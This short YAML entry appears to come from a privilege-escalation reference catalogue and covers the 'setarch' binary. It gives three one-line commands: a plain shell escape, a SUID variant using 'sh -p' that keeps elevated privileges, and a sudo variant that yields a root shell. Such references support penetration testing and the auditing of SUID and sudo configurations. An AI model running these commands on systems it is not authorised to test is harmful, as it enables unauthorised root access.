---
functions:
  shell:
    - code: setarch $(arch) /bin/sh
  suid:
    - code: ./setarch $(arch) /bin/sh -p
  sudo:
    - code: sudo setarch $(arch) /bin/sh
---
